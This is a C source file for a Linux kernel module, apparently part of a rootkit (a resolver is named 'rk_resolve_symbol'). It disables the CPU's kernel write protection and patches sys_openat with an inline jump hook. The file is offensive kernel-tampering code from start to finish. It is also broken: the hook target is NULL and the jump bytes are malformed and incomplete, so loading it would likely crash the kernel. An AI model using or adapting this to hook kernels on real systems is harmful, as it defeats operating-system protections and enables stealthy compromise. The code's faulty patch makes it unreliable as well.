#include "memory_utils.h"
#include "inline_hook.h"
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

static int write_memory(void *addr, void *data, size_t size) {
    unsigned long cr0;
    preempt_disable();
    barrier();
    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    memcpy(addr, data, size);
    write_cr0(cr0);
    barrier();
    preempt_enable();
    return 0;
}

int install_inline_hook(struct inline_hook *hook) {
    unsigned char jump[12] = {0x49, 0xBB};
    unsigned char jmp_r11[2] = {0x41, 0xFF};

    memcpy(hook->original_bytes, hook->target_func, sizeof(hook->original_bytes));
    hook->length = sizeof(jump) + sizeof(jmp_r11);
    memcpy(jump + 2, &hook->hook_func, sizeof(void *));
    unsigned char patch[14];
    memcpy(patch, jump, sizeof(jump));
    memcpy(patch + sizeof(jump), jmp_r11, sizeof(jmp_r11));

    write_memory(hook->target_func, patch, sizeof(patch));
    return 0;
}

void remove_inline_hook(struct inline_hook *hook) {
    write_memory(hook->target_func, hook->original_bytes, hook->length);
}

static struct inline_hook openat_hook;

void setup_inline_hooks(void) {
    unsigned long target = rk_resolve_symbol("sys_openat");
    if (target) {
        openat_hook.target_func = (void *)target;
        openat_hook.hook_func = NULL;
        install_inline_hook(&openat_hook);
    }
}

void remove_inline_hooks(void) {
    remove_inline_hook(&openat_hook);
}
